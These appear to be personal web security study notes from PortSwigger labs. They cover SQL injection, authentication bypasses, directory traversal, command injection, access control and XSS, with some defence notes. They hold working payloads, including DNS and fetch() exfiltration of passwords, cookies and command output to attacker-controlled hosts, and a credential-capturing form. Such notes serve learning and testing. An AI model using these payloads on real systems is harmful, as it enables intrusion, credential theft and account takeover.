# Web Security

This document started as my notes while progressing through PortSwigger Web Security Academy. It's probably going to end up as a random collation of web-based exploitation descriptions, payloads and bypasses.

## SQL Injection

* A vulnerability that allows attackers to interfere and manipulate queries used for DB access. This can allow for reading sensitive data, or db writing/deletion, or sometimes even DoS.
* Can be injected in body parameters for forms and POST request, or query parameters in URLs and GET requests.

### Simple Cases

* Revealing hidden data

  * `x' or 1=1--` to cause query:

  * ```sqlite
    SELECT * FROM products WHERE category = 'x' OR 1=1 --' AND released = 1
    ```

* Bypasses

  * `admin'--` to cause query:

  * ```sqlite
    SELECT * FROM users WHERE username = 'admin'--' AND password = '' 
    ```

### UNION attacks

* `UNION` append the result of additional `SELECT` queries to the results of the original query
* Requires that **other queries return the same number of columns** and the **data types in each column are compatible between individual queries**
* Determine number of columns:
  * Method 1:  keep stacking NULL fields (since NULL is compatible with most data types) until results of original query are actually shown
    * `' UNION SELECT NULL,NULL,NULL--`
  * Method 2: increment `ORDER BY` until the results of original query are NOT shown (since that column number doesn't exist)
    * `' ORDER BY 3--`
* Finding columns with useful data types:
  * After determining number of columns, rotate testing a data type in a single field until there is visible output of original query (meaning no error and thus, compatible type)
    * `' UNION SELECT NULL,'a',NULL--`
* Append data from other table
  * `' UNION SELECT username, password FROM users--`
* Retrieving multiple values with single viewable column
  * Use a suitable concatenation method
  * `' UNION SELECT username||' '||password FROM users--`

### DB Enumeration

* See cheat sheet for DB-specific queries
* DB version enumeration
  * `' UNION SELECT version(),NULL--`
* List tables
  * `' UNION SELECT table_name,NULL from information_schema.tables--`
* List columns
  * `' UNION SELECT column_name,NULL from information_schema.columns where table_name='name'--`

### Blind SQL Injection

* Blind SQL injection involve performing SQL injection where HTTP responses don't contain the results of the SQL query or error details.
* We trigger SQL errors or time delays as per cheat sheet instead
* Example of character by character PW enumeration (if case is right, then output will show):
  * `xyz' AND (SELECT CASE WHEN (username = 'Administrator' AND  SUBSTRING(password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`

### Out Of Band SQL Injection

* Out-of-band techniques all an attacker an alternative vector to infer responses to SQL injections
* Data exfiltration with DNS:
  * `'; declare @p varchar(1024);set @p=(SELECT password FROM users  WHERE username='Administrator');exec('master..xp_dirtree  "//'+@p+'.out_domain.net/a"')-- `

### SQL Injection Filter Bypasses

* Mixed-case keywords for case-sensitive keyword filter
  * `'uNiOn SeleCT ...`
* Wrapped keywords for case-insensitive non-recursive keyword filter
  * `'UNIunionON SELselectECT ...`
* Hex encoding to bypass blocked quotation character ('') for strings
  * `SELECT password from USERS where name=0x61646d696e`, where 0x61646d696e is hex for admin
* Inline comments to avoid whitespace
  * `x'/**/or/**/1=1--`

### Injection Cheat Sheet

#### Comments

| DB         | Comment Style                                                |
| ---------- | ------------------------------------------------------------ |
| Oracle     | `--comment`                                                  |
| Microsoft  | `--comment`<br />`/*comment*/`                               |
| PostgreSQL | `--comment`<br />`/*comment*/`                               |
| MySQL      | `-- comment` (note the space)<br />`#comment`<br />`/*comment*/` |

#### String concatenation

| **Oracle**     | `'foo'||'bar'`                                             |
| -------------- | ---------------------------------------------------------- |
| **Microsoft**  | `'foo'+'bar'`                                              |
| **PostgreSQL** | `'foo'||'bar'`                                             |
| **MySQL**      | `'foo' 'bar'` (note the space)<br />`CONCAT('foo', 'bar')` |

#### Substring

* Extracting part of string by specifying starting index (1-based) and length of substring
* Oracle: `SUBSTR('foobar', 4, 2)`
* MS, PostgreSQL, MySQL: `SUBSTRING('foobar', 4, 2)`

#### Database Version

| DB         | Query                                                        |
| ---------- | ------------------------------------------------------------ |
| Oracle     | `SELECT banner FROM v$version`<br />`SELECT version FROM v$instance` |
| Microsoft  | `SELECT @@version`                                           |
| PostgreSQL | `SELECT version()`                                           |
| MySQL      | `SELECT @@version`                                           |

#### Database Contents

* **Oracle**
  * Get tables: `SELECT table_name FROM all_tables`
  * Get columns: `SELECT column_name FROM all_tab_columns WHERE table_name='<name here>'`
* **MS/PostgreSQL/MySQL**
  * Get tables: `SELECT table_name FROM information_schema.tables`
  * Get columns: `SELECT column_name FROM information_schema.columns WHERE table_name='<name here>'`

#### Conditional Errors

Triggers errors for blind SQL

| DB         | Query                                                        |
| ---------- | ------------------------------------------------------------ |
| Oracle     | `SELECT CASE WHEN (<condition here>) THEN to_char(1/0) ELSE NULL END FROM dual` |
| Microsoft  | `SELECT CASE WHEN (<condition here>) THEN 1/0 ELSE NULL END` |
| PostgreSQL | `SELECT CASE WHEN (<condition here>) THEN cast(1/0 as text) ELSE NULL END` |
| MySQL      | `SELECT IF (<condition here>, (SELECT table_name from information_schema.tables), 'a')` |

#### Time Delays

| DB         | Query                                 |
| ---------- | ------------------------------------- |
| Oracle     | `dbms_pipe.receive_message(('a'),10)` |
| Microsoft  | `WAITFOR DELAY '0:0:10'`              |
| PostgreSQL | `SELECT pg_sleep(10)`                 |
| MySQL      | `SELECT sleep(10)`                    |

## Authentication Vulnerabilities

### Password-Based Vulnerabilities

#### Brute-Force Attacks

* **Brute-forcing usernames**
  * Usernames can usually come in a standardised pattern. Eg: firstname.lastname@company.com
  * Such usernames are predictable, just like `admin` or `administrator`
  * Websites sometimes disclose potential usernames through publicly visible profiles
* **Brute-forcing passwords**
  * Humans introduce weakness to high-entropy password requirements by making minor changes to already simple passwords.
  * When required to change passwords routinely, people usually just change or add a character, or increment a number.
* **Username enumeration**
  * Sometime website behaviour differs when a given username is valid. Such behaviours are:
    * Status codes: A different status code could be used to indicate a provided username was correct (even if password wrong)
    * Error messages: Some sites may have different messages for when only the password is incorrect, vs when both username and password are invalid
    * Response times: Some websites will only check password validity if the username is valid (causing a response time difference)
* **Bypass IP Rate Limiting**
  * You can try spoof an IP address by using the `X-Forwarded-For` HTTP header field
* **Flawed brute-force protection**
  * Common defences against brute-force are to lock the account trying to be accessed after too many failed attempts, or blocking the user's IP after making many attempts in quick succession
  * A simple bypass that may work is logging in with your own credentials at particular intervals, so that the failed attempts counter is reset.

#### Account locking for user enumeration

* Can be used to help attackers enumerate username
* Create a list of usernames and brute-force with a few (less than lock limit) possible passwords that any user could have

#### Multiple Credentials per Request

* Brute-force protection can sometimes be bypassed by sending multiple credentials in a single request
* Eg: if JSON format is used, set the password value to a list of possible passwords.

### MFA Vulnerabilities

* Authentication factors:
  * Something you **know**
  * Something you **have**
  * Something you **are** or do

#### Bypassing 2FA

* If a user is prompted to enter a code on a separate page AFTER having entered password, the user may be in a "logged in" state prior to entering code.
* We may be able to skip to the logged-in only pages after just entering the password if the 2nd factor isn't actually checked
* You could do this by first finding the logged-in page with legitimate credentials, then try load that page after only logging in with the target's password

#### Flawed 2FA Verification Logic

* Flawed logic may allow a user to complete initial login, then allow a different user to complete second step
* So you could use legit credentials to login, then when sending 2nd factor code change the cookie to a target user. You can brute force the 2FA code, but you won't need the victim's password

#### Bruteforcing 2FA codes

* Some sites will log a user out after a number of incorrect 2FA code submissions.
* This can be bypassed with Turbo Intruder and macros to automate logging in and bruteforcing codes.

### Vulnerability in Other Authentication Mechanisms

#### Stay-Logged-In Cookie

* Sites commonly have a "remember me" token which bypasses the login process
* Poor encryption or hashing of this cookie can make it prone to a bruteforce attack.
* Usually limits aren't applied to cookie guesses
* Also by using XSS to steal such a cookie, you could possibly crack a weak hash used offline

#### Resetting User Passwords

* **Sending passwords by email**
  * Sending plaintext persistent passwords over insecure channels like email is susceptible to MitM attacks
* **Reset with a URL**
  * Insecure implementations user URLs with easily guessable parameters to identify which account is being reset. The user in the reset URL could be changed so you can reset another user's password
  * Some website may also fail to invalidate tokens in reset URLs, allowing the same URL to be used again.
  * Or the token may not even be checked at all, but instead the site just relied on a username in a hidden parameter
* **Password reset poisoning**
  * Can use `X-Forwarded-Host` field (specifying a malicious controlled site) when requesting a password reset.
  * An insecure site my use this field to create the reset link, and in doing so will send the token to the attacker via their controlled site.
* **Enumerating current password**
  * A site may have output for entering an incorrect old password and 2 mismatching new passwords, which differs to output when old password is correct and new passwords mismatch.
  * Enumerating this can let us determine the old password.

## Directory Traversal

* Allows an attacker to read arbitrary files by traversing the directory tree

### Reading arbitrary files

* A common location for images is `/var/www/images/`
* We can traverse up to root with`/var/www/images/../../../`

### Common Obstacles/Bypasses

* Traversal sequences (../) are filtered
  * Try to use an absolute path starting with `/`
* Traversal sequences (../) are stripped (non-recursively)
  * Use `....//` or `....\/` instead of `../`
* Use non-standard encodings (like url)
  * UTF-8: `..%c0%af` 
  * ASCII: `%2f` or `..%252f`
    * If the web app URL-decodes again after the browser then the browser will turn `..%252f` into `..%2f` which then gets decoded by the app to `../`
* Required base folder
  * Sometimes a supplied filename must start with the expected base folder (eg: `/var/www/images`) so you can traverse for as long as you start with this folder
* File extension null-byte bypass
  * Apps may require a filename to end with a specific extension
  * It may be possible to use null byte (`%00`) to terminate file path like (`file%00.png`), so the app thinks the correct extension is used, but the null byte terminates the file name early when opening.

### Defense

* User input validation, ideally with a whitelist of values or at least verifying some constraints like only alphanumeric characters
* Input should be appended to base directory and then a platform filesystem API used to canonicalize the path and verify it starts with the expected base dir.

## Command Injection

* Vulnerability that allows an attacker to inject and execute arbitrary OS commands.

### Ways of Injecting OS Commands

* Common separators for Windows and Unix
  * AND (`&&`) - 2nd command executes if the preceding command succeeds
  * OR (`||`) - 2nd command executes if the preceding command fails
  * Pipe (`|`) - Output of first command is input of 2nd command
  * Ampersand (`&`) - Sends current command to background
  * Redirection (`>`, `<`, `>>`) - redirects output out, redirect input stream in, redirects output to append to another stream, respectively
* Unix separators:
  * Semi-colon (`;`) - 2nd command executes after previous (regardless of status)
  * Newline (`\n`)
* Unix inline execution of commands in original command
  *  ``  `injected command`  ``
  * `$ (injected command)`

### Useful Commands

* | Command Purpose      | Linux         | Windows         |
  | -------------------- | ------------- | --------------- |
  | Name of current user | `whoami`      | `whoami`        |
  | OS enum              | `uname -a`    | `ver`           |
  | Network config       | `ifconfig`    | `ipconfig \all` |
  | Network connections  | `netstat -an` | `netstat -an`   |
  | Running processes    | `ps -f`       | `tasklist`      |

### Blind OS Command Injection

* Your input may be injected into some program that doesn't actually have any output (eg: `mail`), so we need to blindly identify a command injection vuln.

#### Detection with Time Delays

* `& ping -c 10 127.0.0.1 &` will cause a 10 second delay if the command is injected successfully.

#### Detection by Redirecting Output

* Redirect output from inject command into a file in web root that we can retrieve later
* Eg: static resources may be accessible by users at `/var/www/static`
* We can then inject and redirect output with:
  * `& <command> > /var/www/static/our_file.txt &`
* We can then access `/our_file.txt` in our browser

#### Exploitation with Out-of-band Techniques

* Detection of command injection
  * Network interactions such at `nslookup` to cause a DNS lookup for your domain to indicate the command inject succeeded
* Exfiltration with command injection
  * Using a domain such as ```  `whoami`.maliciousdomain.com   ``` will cause a DNS lookup to the attack controlled domain, containing the result of the `whoami` command in the subdomain.

### Defense

* Most effective (if possible): never call out to OS commands from application-layer (or at least use safer platform APIs)
* If OS commands MUST be used with user-supplied input:
  * Validate against whitelist
  * Validate input is number (or some other constraint)
  * Or validate input only contains alphanumerics
* NEVER attempt to sanitize input by escaping shell metacharacters. This is too error-prone and can be bypassed.

## Information Disclosure

* Aka information leakage, this is when a site unintentionally reveals sensitive information to users (and/or attackers). This can be commercial/business data, PII/user data, or technical details about the site/infrastructure

### Common Causes

* Failure to remove internal content from public content (eg: comments)
* Insecure configuration of website and related technologies. Eg: keeping debugging and diagnostics features enabled, or verbose error messages
* Flawed design and behaviour of application

### Types of Information Disclosure and Attacks

* `/robots.txt` and directory listings - revealing hidden directories, structures or contents
* Temporary backups - containing source code files
* Error messages - revealing db table or column names
  * Bad input like `null` can trigger verbose stack trace errors revealing framework versions.
* Data exposure - visible PII maybe in response headers or JSON unnecessarily
* Source code - containing hard-coded API keys, IP addresses, DB creds, hidden pages etc
* Version control history (`/.git`) - details like in source code
* Application behaviour - subtle differences in behaviour, hinting at existence or absence of resources/usernames, etc
* `TRACE` HTTP method - debugging mechanism used for message loop-back tests but can reveal unintended information to an attacker

## Access Control & Privilege Escalation

* Access control is the application of constraints on who or what can perform attempted action or access resources they have requested.
* In web apps, access control is dependent on:
  * Authentication - user confirms identity
  * Session management - are subsequent HTTP requests made by same user
  * Access control - is the user allowed to carry out their request action
* Types of access controls:
  * Vertical access controls - mechanisms to restrict access to sensitive functionality not available to other types of users.
  * Horizontal access controls - mechanisms to restrict access to resources, to users who are specifically allowed to access them
  * Context-dependent access controls - controls to restrict access to functionality and resources based upon the state of application or user's interaction with it

### Vertical Privilege Escalation

* When a user gains access to functionality they are not permitted to access

#### Unprotected Functionality

* A `/admin` site which isn't accessible through links may be unprotected accessible directly by guessing the URL
* Such unprotected sites can also be disclosed in `robots.txt` or brute-forced

#### Parameter-based Access Control Methods

* Hidden fields, cookies or other user-controllable locations are sometimes used to keep flags to determine the user's access rights.
  * Eg: `https://sit.com/home?admin=true`

#### Broken Access Control from Platform Misconfiguration

* A rule may be used like

  * `DENY: POST, /admin/deleteUser, managers`

* Headers such as `X-Original-URL` and `X-Rewrite-URL` can be used to bypass this:

  * ```
    POST / HTTP/1.1
    X-Original-URL: /admin/deleteUser
    ```

* Also perhaps other HTTP methods like `GET` or `POSTX` could be used to perform actions on a restricted URL instead.

### Horizontal Privilege Escalation

* This arises when a user can gain access to resources belonging to another user
* Commonly done through **IDOR** - Insecure Direct Object Reference
  * Changing an id parameter to view content for another id
  * Changing a sequentially numbered file name to download different content

### Referer-based Access Control

* `Referer` header is added to indicate the page from which a request was initiated.
* This can be forged and abused if a web app blindly trusts it.

### Defences

* Never rely on obfuscation alone, or security through obscurity
* Deny access to resources by default unless they're intended to be publicly accessible
* When possible, use a single application-wide mechanism for enforcing access controls (so there aren't weaknesses at select points)
* Audit and test access controls

## Cross-site Scripting (XSS)

* A vulnerability that allows an attack to compromise the interactions that users have with a vulnerable app.

### Reflected XSS

* Where the malicious script comes from the current HTTP request
* Tips to find and test for reflected XSS:
  * Test every point - query parameters, message body, URL file path, HTTP headers
  * Submit random alphanumeric values - used for tracing whether the value is reflected in the response. Use Burp Intruder's **grep payloads option**
  * Determine reflection context
  * Test in Burp Repeater and then in a browser.

#### Stealing Cookies

* Cookie will likely be kept in `document.cookie`
* We use `fetch` to send a cookie to our subdomain
  * `fetch('https://domain.com/?q=${document.cookie}')`
  * Or `fetch('https://domain.com', {method: 'POST', mode: 'no-cors', body:document.cookie})`
  * If `document.cookie` is filtered, you can try `window['document']['cookie']`
* Alternatively using `document.location` which runs when the page loads
  * `<script>document.location="https://domain.com/?c="+document.cookie</script>`
* Potential issues:
  * Victim isn't logged in
  * Cookies hidden from JS by using `HttpOnly` flag
  * Session might be locked due to things like IP

#### Capturing Passwords

* This attack abuses password auto-fill by stealing the passwords that get automatically written into 'password' boxes

* ```html
  <input name=username id=username>
  <input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
  method:'POST',
  mode: 'no-cors',
  body:username.value+':'+this.value
  });"> 
  ```

* Alternatively we can even user a timer

* ```html
  <script>
      function x() {
          document.getElementById('creds').innerHTML = document.getElementById('username').value+':'+document.getElementById('password').value;
      }
  
      function timer() {
          setTimeout(x, 1000);
      }
  </script>
  <body onload="timer()">
      <h1 id="creds"></h1>
      <form id="" method="POST" style="visibility: hidden; position: absolute; top: -1000; left: 1000;">
          Username: <input type="text" name="username" id="username" /><br />
          Password: <input type="password" name="password" id="password" /><br />
          <input type="submit" value="gö" />
      </form>
  </body>
  ```

#### XSS for CSRF

* ```html
  <script>
  var req = new XMLHttpRequest();
  req.onload = handleResponse;
  req.open('get','/my-account',true);
  req.send();
  function handleResponse() {
      var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
      var changeReq = new XMLHttpRequest();
      changeReq.open('post', '/my-account/change-email', true);
      changeReq.send('csrf='+token+'&email=test@test.com')
  };
  </script> 
  ```

* 

### Stored XSS

* Where the malicious script comes from the website's database
* How to find and test for stored XSS
  * Test all relevant entry points - parameters in query string and message body, URL file path, HTTP request headers, and out-of-band
  * Locate links between entry and exit points



### DOM-based XSS

* Where the vulnerability exists in client-side code rather than server-side code, when JS processes data from an untrusted source in an unsafe way, usually by writing the data back to the DOM.
* DOM XSS requires a data source and an unsafe `sink` which is a function or object to which the source value is passed

#### Testing for DOM XSS

* **Testing HTML Sinks**
  * Place random alphanum string into source (like `location.search`), then use devtools to inspect HTML and find where string appears.
  * "View source" won't work because it hasn't account for the changes
  * For each location where string appears in the DOM, identify the context
  * Chrome, Firefox and Safari will URL-encode `location.search` and `location.hash` while IE11 will not.
* **Testing JS Execution Sinks**
  * For each potential source, find cases within the JS where the source is being references (Ctrl+Shift+F in devtools).
  * Once found where source is read, use JS debugger to add breakpoint and trace value usage to see if they're passed to a sink.

#### Common Vulnerable Sinks

* `document.write()`
* `document.writeln()`
* `document.domain`
* `element.innerHTML`
* `element.outerHTML`
* `element.insertAdjacentHTML`
* `element.onevent`

jQuery functions that also serve as vulnerable sinks: `add()`, `after()`, `append()`, `animate()`, `insertAfter()`, `insertBefore()`, `before()`, `html()`, `prepend()`, `replaceAll()`, `replaceWith()`, `wrap()`, `wrapInner()`, `wrapAll()`, `has()`, `constructor()`, `init()`, `index()`, `jQuery.parseHTML()`, `$.parseHTML()`.

### XSS Contexts

#### Between HTML Tags



#### In HTML Tag Attributes



#### In JavaScript



#### In AngularJS Sandbox



### Content Security Policy



### Dangling Markup Attack



